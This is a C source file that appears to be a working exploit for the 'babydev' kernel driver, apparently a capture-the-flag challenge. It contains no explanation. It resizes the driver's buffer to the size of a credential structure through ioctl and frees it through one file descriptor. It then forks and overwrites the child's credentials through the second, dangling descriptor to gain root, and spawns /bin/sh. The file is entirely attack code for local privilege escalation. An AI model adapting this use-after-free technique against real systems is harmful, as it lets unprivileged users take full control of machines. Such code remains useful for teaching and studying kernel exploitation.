#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/wait.h>

int main()
{
	int fd1 = open("/dev/babydev", 2);
	int fd2 = open("/dev/babydev", 2);
	char buf[28] = {0};
	if(fd1 < 0 || fd2 < 0)
	{
		puts("[-] open error");
		exit(-1);
	}
	
	ioctl(fd1, 0x10001, 0xa8);
	close(fd1);
	
	int pid = fork();
	if(pid < 0)
	{
		puts("[-] fork error");
		exit(-1);
	}
	else if(pid == 0)
	{
		write(fd2, buf, 28);
		if(getuid() == 0)
		{
			puts("[+] root now");
			system("/bin/sh");
		}
	}
	else
	{
		wait(NULL);
	}
	close(fd2);
	return 0;
}
